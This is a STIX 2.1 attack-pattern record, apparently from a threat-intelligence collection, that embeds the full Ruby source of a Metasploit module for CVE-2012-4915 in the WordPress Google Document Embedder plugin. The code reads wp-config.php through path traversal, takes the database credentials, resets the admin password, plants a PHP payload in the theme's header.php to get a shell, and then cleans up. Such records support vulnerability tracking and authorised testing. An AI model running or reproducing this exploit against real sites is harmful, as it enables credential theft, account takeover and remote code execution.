{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d41a07f1-8114-47d6-a3c9-459781e47931",
    "created": "2024-08-14T17:12:35.277526Z",
    "modified": "2024-08-14T17:12:35.277529Z",
    "name": "WordPress Plugin Google Document Embedder Arbitrary File Disclosure",
    "description": " This module exploits an arbitrary file disclosure flaw in the WordPress blogging software plugin known as Google Document Embedder. The vulnerability allows for database credential disclosure via the /libs/pdf.php script. The Google Document Embedder plug-in versions 2.4.6 and below are vulnerable. This exploit only works when the MySQL server is exposed on an accessible IP and WordPress has filesystem write access.  Please note: The admin password may get changed if the exploit does not run to the end. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_google_document_embedder_exec.rb",
            "external_id": "wp_google_document_embedder_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4915"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20130119141940/http://secunia.com/advisories/50832/"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6073"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rbmysql'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress Plugin Google Document Embedder Arbitrary File Disclosure',\n      'Description'    => %q{\n          This module exploits an arbitrary file disclosure flaw in the WordPress\n        blogging software plugin known as Google Document Embedder. The vulnerability allows for\n        database credential disclosure via the /libs/pdf.php script. The Google Document Embedder\n        plug-in versions 2.4.6 and below are vulnerable. This exploit only works when the MySQL\n        server is exposed on an accessible IP and WordPress has filesystem write access.\n\n        Please note: The admin password may get changed if the exploit does not run to the end.\n      },\n      'Author'         =>\n        [\n          'Charlie Eriksen',\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2012-4915'],\n          ['OSVDB', '88891'],\n          ['URL', 'http://web.archive.org/web/20130119141940/http://secunia.com/advisories/50832/'],\n          ['WPVDB', '6073']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find',\n            },\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2013-01-03',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The full URI path to WordPress', '/']),\n        OptString.new('PLUGINSPATH', [true, 'The relative path to the plugins folder', 'wp-content/plugins/']),\n        OptString.new('ADMINPATH', [true, 'The relative path to the admin folder', 'wp-admin/']),\n        OptString.new('THEMESPATH', [true, 'The relative path to the admin folder', 'wp-content/themes/'])\n      ])\n  end\n\n  def check\n    uri = target_uri.path\n    uri << '/' if uri[-1,1] != '/'\n    plugins_uri = String.new(uri)\n    plugins_uri << datastore['PLUGINSPATH']\n    plugins_uri << '/' if plugins_uri[-1,1] != '/'\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => \"#{plugins_uri}google-document-embedder/libs/pdf.php\",\n    })\n\n    if res and res.code == 200\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    uri = target_uri.path\n    uri << '/' if uri[-1,1] != '/'\n    plugins_uri = String.new(uri)\n    plugins_uri << datastore['PLUGINSPATH']\n    plugins_uri << '/' if plugins_uri[-1,1] != '/'\n    admin_uri = String.new(uri)\n    admin_uri << datastore['ADMINPATH']\n    admin_uri << '/' if plugins_uri[-1,1] != '/'\n    themes_uri = String.new(uri)\n    themes_uri << datastore['THEMESPATH']\n    themes_uri << '/' if plugins_uri[-1,1] != '/'\n\n    print_status('Fetching wp-config.php')\n    res = send_request_cgi({\n      'method'     => 'GET',\n      'uri'        => \"#{plugins_uri}google-document-embedder/libs/pdf.php\",\n      'vars_get'   =>\n        {\n          'fn'   => \"#{rand_text_alphanumeric(4)}.pdf\",\n          'file' => \"#{'../' * plugins_uri.count('/')}wp-config.php\",\n        }\n    })\n\n    if res and res.body =~ /allow_url_fopen/\n      fail_with(Failure::NotVulnerable, 'allow_url_fopen and curl are both disabled')\n    elsif res.code != 200\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply - #{res.code}\")\n    end\n\n    config = parse_wp_config(res.body)\n    if not ['DB_HOST', 'DB_PORT', 'DB_USER', 'DB_PASSWORD', 'DB_NAME'].all? { |parameter| config.has_key?(parameter) }\n      fail_with(Failure::UnexpectedReply, \"The config file did not parse properly\")\n    end\n    begin\n      @mysql_handle = ::RbMysql.connect(config['DB_HOST'],\n                                        config['DB_USER'],\n                                        config['DB_PASSWORD'],\n                                        config['DB_NAME'],\n                                        config['DB_PORT'])\n    rescue Errno::ECONNREFUSED,\n      RbMysql::ClientError,\n      Errno::ETIMEDOUT,\n      RbMysql::AccessDeniedError,\n      RbMysql::HostNotPrivileged\n      fail_with(Failure::NotVulnerable, 'Unable to connect to the MySQL server')\n    end\n    res = @mysql_handle.query(\"SELECT user_login, user_pass FROM #{config['DB_PREFIX']}users U\n                  INNER JOIN #{config['DB_PREFIX']}usermeta M ON M.user_id = U.ID AND M.meta_key = 'wp_user_level' AND meta_value = '10' LIMIT 1\")\n\n    if res.nil? or res.size <= 0\n      fail_with(Failure::UnexpectedReply, 'No admin was account found')\n    end\n\n    user = res.first\n\n    new_password = rand_text_alphanumeric(8)\n    @mysql_handle.query(\"UPDATE #{config['DB_PREFIX']}users SET user_pass = '#{::Rex::Text.md5(new_password)}' WHERE user_login = '#{user[0]}'\")\n    print_warning(\"Admin password changed to: #{new_password}\")\n\n    admin_cookie = get_wp_cookie(uri, user[0], new_password)\n\n    theme, nonce, old_content = get_wp_theme(admin_uri, admin_cookie)\n\n    print_warning(\"Editing theme #{theme}\")\n    set_wp_theme(admin_uri, admin_cookie, nonce, theme, payload.encoded)\n\n    print_status(\"Calling backdoor\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => \"#{themes_uri}#{theme}/header.php\",\n    })\n\n    if res and res.code != 200\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply - #{res.code}\")\n    end\n\n    set_wp_theme(admin_uri, admin_cookie, nonce, theme, old_content)\n\n    @mysql_handle.query(\"UPDATE #{config['DB_PREFIX']}users SET user_pass = '#{user[1]}' WHERE user_login = '#{user[0]}'\")\n\n    print_status(\"Shell should have been acquired. Disabled backdoor\")\n  end\n\n  def parse_wp_config(body)\n    p = store_loot('wordpress.config', 'text/plain', rhost, body, \"#{rhost}_wp-config.php\")\n    print_good(\"wp-config.php saved in: #{p}\")\n    print_status(\"Parsing config file\")\n    values = {}\n\n    body.each_line do |line|\n      if line =~ /define/\n        key_pair = line.scan(/('|\")([^'\"]*)('|\")/)\n        if key_pair.length == 2\n          values[key_pair[0][1]] = key_pair[1][1]\n        end\n      elsif line =~ /table_prefix/\n        table_prefix = line.scan(/('|\")([^'\"]*)('|\")/)\n        values['DB_PREFIX'] = table_prefix[0][1]\n      end\n    end\n    #Extract the port from DB_HOST and normalize DB_HOST\n    values['DB_PORT'] = values['DB_HOST'].include?(':') ? values['DB_HOST'].split(':')[1] : 3306\n\n    if values['DB_HOST'] =~ /(localhost|127.0.0.1)/\n      print_status(\"DB_HOST config value was a loopback address. Trying to resolve to a proper IP\")\n      values['DB_HOST'] = ::Rex::Socket.getaddress(datastore['RHOST'])\n    end\n\n    return values\n  end\n\n  def get_wp_cookie(uri, username, password)\n    res = send_request_cgi({\n      'method'     => 'POST',\n      'uri'        => \"#{uri}wp-login.php\",\n      'cookie'     => 'wordpress_test_cookie=WP+Cookie+check',\n      'vars_post'  =>\n        {\n          'log'        => username,\n          'pwd'        => password,\n          'wp-submit'  => 'Log+In',\n          'testcookie' => '1',\n        },\n    })\n\n    if res and res.code == 200\n      fail_with(Failure::UnexpectedReply, 'Admin login failed')\n    elsif res and res.code != 302\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply - #{res.code}\")\n    end\n\n    admin_cookie = res.get_cookies\n\n    if admin_cookie.empty?\n      fail_with(Failure::UnexpectedReply, 'The resulting cookie was empty')\n    end\n\n    return admin_cookie\n  end\n\n  def get_wp_theme(admin_uri, admin_cookie)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => \"#{admin_uri}theme-editor.php?file=header.php\",\n      'cookie' => admin_cookie,\n    })\n\n    if res and res.code != 200\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply - #{res.code}\")\n    elsif res and res.body.scan(/<input.+?name=\"submit\".+?class=\"button button-primary\"/).length == 0\n      fail_with(Failure::NotVulnerable, 'Wordpress does not have write access')\n    end\n\n    nonce = res.body.scan(/<input.+?id=\"_wpnonce\".+?value=\"(.+?)\"/)[0][0].to_s\n    old_content = Rex::Text.html_decode(Rex::Text.html_decode(res.body.scan(/<textarea.+?id=\"newcontent\".+?>(.*)<\\/textarea>/m)[0][0].to_s))\n    theme = res.body.scan(/<input.+?name=\"theme\".+?value=\"(.+?)\"/)[0][0].to_s\n\n    return [theme, nonce, old_content]\n  end\n\n  def set_wp_theme(admin_uri, admin_cookie, nonce, theme, new_content)\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => \"#{admin_uri}theme-editor.php?\",\n      'cookie'    => admin_cookie,\n      'vars_post' =>\n        {\n          '_wpnonce'   => nonce,\n          'theme'      => theme,\n          'newcontent' => new_content,\n          'action'     => 'update',\n          'file'       => 'header.php'\n        },\n    })\n\n    if res and res.code != 302\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply - #{res.code}\")\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-01-03",
    "x_mitre_platforms": [
        "php'"
    ]
}